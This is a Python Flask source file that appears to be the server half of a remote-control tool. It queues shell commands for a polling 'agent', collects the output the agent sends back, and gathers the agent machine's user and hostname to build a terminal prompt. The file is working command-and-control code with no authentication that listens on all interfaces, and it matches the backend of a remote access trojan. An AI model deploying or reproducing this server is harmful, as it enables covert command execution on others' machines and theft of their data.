from flask import Flask, request, jsonify, render_template, redirect, url_for

app = Flask(__name__)

system_info = {}
info_requested = False
terminal_prompt = "user@agent"

state = {
    "command": None,
    "result": None,
    "acknowledged": False,
}

@app.route('/')
def index():
    return render_template('terminal.html', prompt_host=terminal_prompt)

@app.route('/set_command', methods=['POST'])
def set_command():
    data = request.get_json()
    state["command"] = data.get("command")
    state["result"] = None
    state["acknowledged"] = False
    print(f"[SET] Command set: {state['command']}")
    return '', 204

@app.route('/get_command', methods=['GET'])
def get_command():
    if not state["acknowledged"] and state["command"]:
        print(f"[GET] Agent pulled command: {state['command']}")
        return state["command"]
    return "none"

@app.route('/post_result', methods=['POST'])
def post_result():
    data = request.get_json()
    result = data.get('result', '').strip()
    if result:
        state["result"] = result
        state["acknowledged"] = True
        state["command"] = None
        print(f"[POST] Result received:\n{result}")
    return '', 204

@app.route('/get_result', methods=['GET'])
def get_result():
    if state["acknowledged"] and state["result"]:
        return state["result"]
    return "pending"

@app.route('/system')
def system():
    return render_template('system.html', info=system_info)

@app.route('/request_info', methods=['GET'])
def request_info():
    global info_requested
    info_requested = True
    return redirect(url_for('system'))

@app.route('/should_post_info', methods=['GET'])
def should_post_info():
    return "yes" if info_requested else "no"

@app.route('/post_info', methods=['POST'])
def post_info():
    global system_info, info_requested, terminal_prompt
    system_info = request.get_json()
    info_requested = False

    user = system_info.get("user", "user")
    hostname = system_info.get("hostname", "agent")
    terminal_prompt = f"{user}@{hostname}"

    print(f"[SYSINFO] Received system info from {terminal_prompt}")
    return '', 204

if __name__ == '__main__':
    print("[*] Flask live terminal server running...")
    app.run(host='0.0.0.0', port=5001)
